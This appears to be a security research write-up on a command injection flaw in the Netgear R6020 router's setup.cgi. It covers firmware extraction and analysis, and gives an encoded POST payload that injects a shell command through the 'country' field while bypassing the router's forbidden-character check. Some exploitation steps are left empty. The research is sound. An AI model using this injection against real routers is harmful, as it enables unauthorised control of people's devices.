## Hacking the Netgear R6020

### 1. Getting the Firmware

Firmware for this router can be found at <https://www.netgear.com/support/product/R6020.aspx#download>

The version in this blog is `1.0.0.48`

#

### 2. Extracting the Root Filesystem
Use binwalk to extract firmware files.

```console
j-o-e-l-s@machine:~/Downloads$ binwalk -e R6020_V1.0.0.48.zip 
j-o-e-l-s@machine:~/Downloads$ cd _R6020_V1.0.0.48.zip.extracted
j-o-e-l-s@machine:~/Downloads/_R6020_V1.0.0.48.zip.extracted$ binwalk -e R6020_V1.0.0.48.img 
j-o-e-l-s@machine:~/Downloads/_R6020_V1.0.0.48.zip.extracted$ cd _R6020_V1.0.0.48.img.extracted/
j-o-e-l-s@machine:~/Downloads/_R6020_V1.0.0.48.zip.extracted/_R6020_V1.0.0.48.img.extracted$ binwalk -e R6020.bin 
```

We can now look at the root filesystem files.
```console
j-o-e-l-s@machine:~/Downloads/_R6020_V1.0.0.48.zip.extracted/_R6020_V1.0.0.48.img.extracted/_R6020.bin.extracted/squashfs-root$ ls
bin   dev  etc_ro  init  media  proc  sys  usr  www
data  etc  home    lib   mnt    sbin  tmp  var  www.eng
```

#

### 3. Identifying Files of Interest
This router uses `.cgi` files to handle web requests and input sanitization so any of these file are available for analysis.
```sh
j-o-e-l-s@machine:~/squashfs-root$ find -name "*.cgi*"
./usr/etc/htpwd_recovery.cgi
./usr/etc/restore_config.cgi
./usr/etc/upgrade_stringTbl.cgi
./usr/etc/upgrade_flash.cgi
./usr/etc/setup.cgi
./usr/sbin/htpwd_recovery.cgi
./usr/sbin/restore_config.cgi
./usr/sbin/upgrade_flash.cgi
./usr/sbin/setupwizard.cgi
./usr/sbin/setup.cgi
```
 #
 
 ### 4. Analyzing setup.cgi
 Within setup.cgi there is a function that I named `do_fullscan` that is invoked by a HTML POST to setup.cgi.
 
 ![image](https://user-images.githubusercontent.com/90354476/133103817-6183c15a-f511-41e4-ad79-cdc415ec7fdc.png)
 
 Within this function a shell command is executed using formatted strings:
 
 ![image](https://user-images.githubusercontent.com/90354476/133106054-76a12201-d9b1-4b84-8618-16e0efdfdd3a.png)

 ![image](https://user-images.githubusercontent.com/90354476/133104386-36cf5239-f830-4f00-ab92-094e709adec5.png)
 
 So all I have to do is change one of the `%s` variables to be an arbitrary shell command. 
 
 In this case I'm going to modify the first formatted string `wiz_country`.
 
 Another thing I have to change is the region. There is a line 
 ```cpp
 if (region_is_NA() == 0)
 ```
 that controls whether wiz_country is simply `US` or a user supplied value.

#

### 5. Overview of Exploitation Steps
- Change the region to be anything but NA
- Modify wiz_country to inject a shell command.
- Invoke vulnerable function 

#

### 6. Changing the Region

#

### 7. Modifying wiz_country

To modify `wiz_country` we can use the function `changeLang`. It can be invoked with a POST to `setup.cgi` and looks like:
```python
language=English&country=United+States&todo=changeLang
```

Here country corresponds to `wiz_country`.

I want to change this to be a ping command:
```python
>>> urllib.parse.quote('" & ping 10.0.0.2 & "')
'%22%20%26%20ping%2010.0.0.2%20%26%20%22'
```

So the new POST will look like:
```python
language=English&country=%22%20%26%20ping%2010.0.0.2%20%26%20%22&todo=changeLang
```

The `&` in the ping command is important because there are forbidden value checks. For instance `$(` `||` `&&` are forbidden among a few others, however the singular `&` is allowed which allows the first part of the shell command to be parsed seperately and ran in the background.

#

### 8. Invoking do_fullscan 
